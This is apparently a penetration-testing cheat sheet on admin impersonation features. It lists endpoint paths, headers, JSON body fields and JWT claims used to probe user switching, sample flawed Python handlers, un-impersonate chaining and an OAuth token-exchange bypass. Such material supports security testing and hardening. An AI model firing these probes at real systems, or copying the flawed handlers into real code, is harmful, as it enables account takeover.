# Impersonation — su/switch_user/become and the delegated-identity surface

Many apps let an admin (or a flow) act as another user. The feature is
legitimate; the checks around it are often thin. This file catalogs the
shapes and the bypasses.

---

## 1. The surface names

```
GET|POST /su?user=victim
GET|POST /switch_user?victim
GET|POST /_switch_user?victim
GET|POST /become?victim
GET|POST /impersonate?victim
GET|POST /impersonate/{id}
POST /admin/impersonate {user_id:victim}
POST /admin/su {user_id:victim}
POST /admin/switch_user {user_id:victim}
POST /admin/become {user_id:victim}
POST /admin/login_as {user_id:victim}
POST /admin/loginAs {user_id:victim}
POST /admin/login-as {user_id:victim}
POST /admin/act_as {user_id:victim}
POST /admin/actAs {user_id:victim}
POST /admin/act-as {user_id:victim}
POST /admin/masquerade {user_id:victim}
POST /admin/masq {user_id:victim}
POST /admin/on_behalf_of {user_id:victim}
POST /admin/onBehalfOf {user_id:victim}
POST /admin/on-behalf-of {user_id:victim}
POST /admin/proxy {user_id:victim}
POST /admin/proxy_user {user_id:victim}
POST /admin/proxyUser {user_id:victim}
POST /admin/proxy-user {user_id:victim}
POST /admin/delegate {user_id:victim}
POST /admin/delegate_user {user_id:victim}
POST /admin/delegateUser {user_id:victim}
POST /admin/delegate-user {user_id:victim}
POST /admin/sudo {user_id:victim}
POST /admin/sudo_user {user_id:victim}
POST /admin/sudoUser {user_id:victim}
POST /admin/sudo-user {user_id:victim}
POST /admin/su {user_id:victim}
POST /admin/su_user {user_id:victim}
POST /admin/suUser {user_id:victim}
POST /admin/su-user {user_id:victim}
POST /admin/as {user_id:victim}
POST /admin/as_user {user_id:victim}
POST /admin/asUser {user_id:victim}
POST /admin/as-user {user_id:victim}
POST /admin/assume {user_id:victim}
POST /admin/assume_user {user_id:victim}
POST /admin/assumeUser {user_id:victim}
POST /admin/assume-user {user_id:victim}
POST /admin/assume_role {user_id:victim}
POST /admin/assumeRole {user_id:victim}
POST /admin/assume-role {user_id:victim}
GET /admin/su?user=victim
GET /admin/switch_user?victim
GET /admin/become?victim
GET /admin/impersonate?victim
GET /admin/login_as?victim
GET /admin/act_as?victim
GET /admin/masquerade?victim
GET /admin/on_behalf_of?victim
GET /admin/proxy?victim
GET /admin/delegate?victim
GET /admin/sudo?victim
GET /admin/as?victim
GET /admin/assume?victim
?su=victim
?switch_user=victim
?become=victim
?impersonate=victim
?login_as=victim
?act_as=victim
?masquerade=victim
?on_behalf_of=victim
?proxy=victim
?delegate=victim
?sudo=victim
?as=victim
?assume=victim
?user_id=victim&_su=1
?user_id=victim&_switch=1
?user_id=victim&_become=1
?user_id=victim&_impersonate=1
?user_id=victim&_masq=1
?user_id=victim&_proxy=1
?user_id=victim&_delegate=1
?user_id=victim&_sudo=1
?user_id=victim&_as=1
?user_id=victim&_assume=1
```

## 2. The header shapes

```
X-Switch-User: victim
X-Impersonate: victim
X-Become-User: victim
X-Login-As: victim
X-Act-As: victim
X-On-Behalf-Of: victim
X-Proxy-User: victim
X-Delegate-User: victim
X-Sudo-User: victim
X-As-User: victim
X-Assume-User: victim
X-Assume-Role: admin
X-User: victim
X-Real-User: victim
X-Effective-User: victim
X-Effective-Role: admin
X-Effective-Id: victim
X-Effective-Sub: victim
X-Real-Id: victim
X-Real-Sub: victim
X-Forwarded-User: victim
X-Forwarded-Id: victim
X-Forwarded-Sub: victim
X-Authenticated-User: victim
X-Authenticated-Id: victim
X-Authenticated-Sub: victim
X-Auth-User: victim
X-Auth-Id: victim
X-Auth-Sub: victim
X-Remote-User: victim
X-Remote-Id: victim
X-Remote-Sub: victim
REMOTE_USER: victim
REMOTE_ID: victim
REMOTE_SUB: victim
```

## 3. The body shapes

```json
{"su":"victim"}
{"switch_user":"victim"}
{"become":"victim"}
{"impersonate":"victim"}
{"login_as":"victim"}
{"act_as":"victim"}
{"masquerade":"victim"}
{"on_behalf_of":"victim"}
{"proxy":"victim"}
{"delegate":"victim"}
{"sudo":"victim"}
{"as":"victim"}
{"assume":"victim"}
{"user_id":"victim","su":true}
{"user_id":"victim","switch_user":true}
{"user_id":"victim","become":true}
{"user_id":"victim","impersonate":true}
{"user_id":"victim","act_as":true}
{"user_id":"victim","masquerade":true}
{"user_id":"victim","on_behalf_of":true}
{"user_id":"victim","proxy":true}
{"user_id":"victim","delegate":true}
{"user_id":"victim","sudo":true}
{"user_id":"victim","as":true}
{"user_id":"victim","assume":true}
{"target_user":"victim"}
{"targetUser":"victim"}
{"targetUserId":"victim"}
{"target_id":"victim"}
{"targetId":"victim"}
{"target_user_id":"victim"}
{"impersonate_id":"victim"}
{"impersonateId":"victim"}
{"impersonate_user_id":"victim"}
{"masquerade_id":"victim"}
{"masqueradeId":"victim"}
{"masquerade_user_id":"victim"}
{"on_behalf_of_id":"victim"}
{"onBehalfOfId":"victim"}
{"on_behalf_of_user_id":"victim"}
{"delegate_id":"victim"}
{"delegateId":"victim"}
{"delegate_user_id":"victim"}
{"sudo_id":"victim"}
{"sudoId":"victim"}
{"sudo_user_id":"victim"}
{"assume_id":"victim"}
{"assumeId":"victim"}
{"assume_user_id":"victim"}
{"su_id":"victim"}
{"suId":"victim"}
{"su_user_id":"victim"}
{"as_id":"victim"}
{"asId":"victim"}
{"as_user_id":"victim"}
{"become_id":"victim"}
{"becomeId":"victim"}
{"become_user_id":"victim"}
{"proxy_id":"victim"}
{"proxyId":"victim"}
{"proxy_user_id":"victim"}
{"real_id":"victim"}
{"realId":"victim"}
{"real_user_id":"victim"}
{"effective_id":"victim"}
{"effectiveId":"victim"}
{"effective_user_id":"victim"}
{"forwarded_id":"victim"}
{"forwardedId":"victim"}
{"forwarded_user_id":"victim"}
{"authenticated_id":"victim"}
{"authenticatedId":"victim"}
{"authenticated_user_id":"victim"}
{"remote_id":"victim"}
{"remoteId":"victim"}
{"remote_user_id":"victim"}
{"switch_id":"victim"}
{"switchId":"victim"}
{"switch_user_id":"victim"}
```

## 4. The check that SHOULD exist

```python
# right
def impersonate(user_id):
    if not request.user.is_admin: return 403
    if user_id == request.user.id: return 400  # can't self
    target = User.get(user_id)
    if not target: return 404
    log("impersonate", by=request.user.id, as=user_id)
    session['impersonator_id'] = request.user.id  # keep the real one
    session['user_id'] = user_id
    return redirect('/')

# the bugs
def impersonate(user_id):
    session['user_id'] = user_id  # NO check
    return redirect('/')

def impersonate(user_id):
    if user_id == request.user.id: return 400  # only self-check
    session['user_id'] = user_id
    return redirect('/')

def impersonate(user_id):
    if not request.user.is_staff: return 403  # staff not admin
    session['user_id'] = user_id
    return redirect('/')

def impersonate(user_id):
    if not request.user.is_admin: return 403
    session['user_id'] = user_id
    # no impersonator_id kept — can't un-impersonate
    return redirect('/')
```

## 5. The "un-impersonate" surface

The way back is also a bug surface:

- `POST /unimpersonate` / `/unbecome` / `/unmasquerade` — restores the
  original. If the original `user_id` was *itself* an impersonation,
  you chain impersonations.
- `session['impersonator_id']` — if you can write it, you impersonate
  *as* someone else while appearing to be the admin.
- `?unimpersonate=1` — a GET-unimpersonate is CSRF-able.
- `session['real_user_id']` / `session['original_user_id']` /
  `session['pre_impersonate_id']` — the field names to look for.

## 6. The "impersonate an impersonator" chain

```
admin → impersonate user1 → still has impersonator_id=admin
  → impersonate user2 → now impersonator_id=user1
  → unimpersonate → lands as user1, not admin
```

The chain is lossy — the "real" identity is overwritten by each
impersonation. If the chain doesn't preserve the *root* impersonator,
you can't get back to admin.

## 7. JWT `act`/`may_act`/`delegated_sub`

```json
{"sub":"user1","act":{"sub":"admin"}}
{"sub":"user1","may_act":{"sub":"admin"}}
{"sub":"user1","delegated_sub":"admin"}
{"sub":"user1","delegatedSub":"admin"}
{"sub":"user1","actor":{"sub":"admin"}}
{"sub":"user1","act":{"sub":"admin","delegated":true}}
{"sub":"user1","may_act":{"sub":"admin","delegated":true}}
{"sub":"user1","act":{"sub":"admin","scope":"*"}}
{"sub":"user1","authorized_party":"admin"}
{"sub":"user1","azp":"admin"}
{"sub":"user1","on_behalf_of":"admin"}
{"sub":"user1","obo":"admin"}
{"sub":"user1","impersonated_by":"admin"}
{"sub":"user1","impersonator":"admin"}
{"sub":"user1","original_sub":"admin"}
{"sub":"user1","real_sub":"admin"}
{"sub":"user1","effective_sub":"admin"}
{"sub":"user1","acting_sub":"admin"}
{"sub":"user1","as_sub":"admin"}
{"sub":"user1","su_sub":"admin"}
{"sub":"user1","sudo_sub":"admin"}
{"sub":"user1","assume_sub":"admin"}
{"sub":"user1","switch_sub":"admin"}
{"sub":"user1","become_sub":"admin"}
{"sub":"user1","proxy_sub":"admin"}
{"sub":"user1","delegate_sub":"admin"}
{"sub":"user1","masquerade_sub":"admin"}
```

If the verify path accepts `act`/`may_act`/`delegated_sub` and resolves
the *inner* `sub` for authz, forging the outer token gets you the inner
identity.

## 8. The "audit log" check

A well-built impersonation writes an audit row:

```sql
INSERT INTO audit (impersonator_id, impersonated_id, at) VALUES (...)
```

If the code path for impersonation doesn't write the audit → it's a
backdoor feature, not a maintained one.

## 9. The token-exchange surface

OAuth Token Exchange (`urn:ietf:params:oauth:grant-type:token-exchange`):

```
POST /token
grant_type=urn:ietf:params:oauth:grant-type:token-exchange
subject_token=<your-token>
subject_token_type=urn:ietf:params:oauth:token-type:access_token
requested_token_type=urn:ietf:params:oauth:token-type:access_token
actor_token=<admin-token>
actor_token_type=urn:ietf:params:oauth:token-type:access_token
```

Returns a token that acts *as the subject, on behalf of the actor* —
if `actor_token` isn't verified to *be* an admin, you set
`actor_token=<your-own>` and act as anyone.

## 10. Falsifiers

- The `su`/`switch_user`/`impersonate` endpoint returns `403` — the
  check exists.
- `?su=` accepted but `session.user_id` doesn't change — the param is
  decorative.
- `session['impersonator_id']` written but never read — display-only.
- The `act`/`may_act`/`delegated_sub` claim is present in the token but
  the authz path resolves `sub` — the claim is informational.
- The `unimpersonate` path returns `400` — the feature doesn't exist.
